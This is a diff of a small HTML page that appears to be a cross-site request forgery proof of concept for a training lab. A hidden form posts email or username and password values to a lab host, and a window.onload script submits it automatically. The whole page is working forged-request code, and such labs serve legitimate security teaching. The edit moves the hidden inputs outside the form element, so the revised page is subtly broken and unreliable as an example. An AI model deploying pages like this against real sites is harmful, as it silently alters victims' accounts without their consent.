@@ -1,16 +1,14 @@
 <html>
 <body>
   <h1> TEST </h1>
-  <form id='id' method="POST" action="https://csrf1.vulns101.ar7z1.com/">
-    <input type="hidden" name="email" value="123@gmail.com"/>
-    <input type="hidden" name="password" value="456"/>
-  </form>
-  <script> 
+  <form id='id' method="POST" action="https://csrf1.vulns101.ar7z1.com/"> </form>
+    <p><input type="hidden" name="username" value="123@gmail.com"></p>
+<p><input type="hidden" name="password" value="456"></p>
+ 
+ 
 <script> 
-window.onload = 
-function(){ 
-let f=document.getElementById('id');  
-form.submit(f); 
+window.onload = function(){ 
+document.getElementById("id").submit();
 } 
 </script>
   </body>
